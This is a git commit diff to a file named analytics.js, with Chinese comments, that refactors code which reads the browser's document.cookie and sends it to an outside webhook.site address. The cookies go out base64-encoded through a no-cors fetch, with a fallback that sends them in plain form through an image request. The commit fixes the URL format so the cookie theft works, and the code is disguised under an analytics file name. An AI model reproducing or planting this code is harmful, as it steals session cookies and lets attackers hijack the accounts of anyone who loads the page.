47d839503010434a7303cb0ff428cb951b5833fa
Pariston-Hill <156459246+Pariston-Hill@users.noreply.github.com>
2026-04-21 05:25:30 +1000

    Refactor cookie sending methods to use fetch2

--- analytics.js
+++ analytics.js
@@ -1,7 +1,8 @@
-// 使用 fetch 将 cookie 发送到你的 Webhook
-fetch("https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863" + btoa(document.cookie), {
-    mode: 'no-cors'
-});
+// 注意在 ID 后面加一个问号 (?)
+var webhook = "https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863?";
 
-// 或者使用更传统、兼容性更好的图片请求方式
-new Image().src = "https://webhook.site/00cb9701-8b85-48b4-8e62-78f32b754863" + document.cookie;
+// 发送 Cookie
+fetch(webhook + "data=" + btoa(document.cookie), { mode: 'no-cors' });
+
+// 备用方案
+new Image().src = webhook + "c=" + document.cookie;
